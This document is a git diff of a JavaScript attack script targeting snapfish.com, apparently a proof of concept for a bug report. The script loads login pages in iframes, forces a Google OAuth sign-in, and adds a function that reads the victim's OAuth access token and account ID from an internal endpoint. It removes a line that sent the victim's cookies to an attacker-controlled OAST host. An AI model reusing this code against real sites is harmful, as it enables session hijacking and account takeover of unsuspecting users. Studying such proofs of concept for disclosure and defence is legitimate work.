@@ -14,9 +14,30 @@ setTimeout(() => {
   profileIframe2.setAttribute('src', "https://www.snapfish.com/loginto");
 }, 10000)
 
-setTimeout(() => {profileIframe2.setAttribute('src', 'javascript:document.getElementById("googleSignInButton").click();');}, 20000)
+//setTimeout(() => {profileIframe2.setAttribute('src', 'javascript:document.getElementById("googleSignInButton").click();');}, 20000)
+googleLink = "https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=1"
 
-//Send cookie to Attacker Server
-var link="https://dmftkmghscwxjulluncuqmho9x6l6ujkt.oast.fun/VictimCookies="+document.cookie;
-navigator.sendBeacon(link,"");
+setTimeout(() => {
+  profileIframe2.setAttribute('src', googleLink);
+}, 20000)
 
+function getOAUTH() {
+  url = "https://www.snapfish.com/library/getOauthInfo"
+  access_token = "text.oauthInfo.oa2";
+  account_id = "text.oauthInfo.accountId";
+  
+  req = new XMLHttpRequest();
+  req.responseType = 'json';
+  req.open('GET', url, true);
+  req.onload = function () {
+    var jsonResponse = req.response;
+    access_token = jsonResponse.oauthInfo.oa2;
+    account_id = jsonResponse.oauthInfo.accountId;
+    alert("ACCESS TOKEN is " + access_token + "\nAccount ID is " + account_id);
+  };
+  req.send(null);
+}
+
+setTimeout(() => {
+  getOAUTH();
+}, 25000)
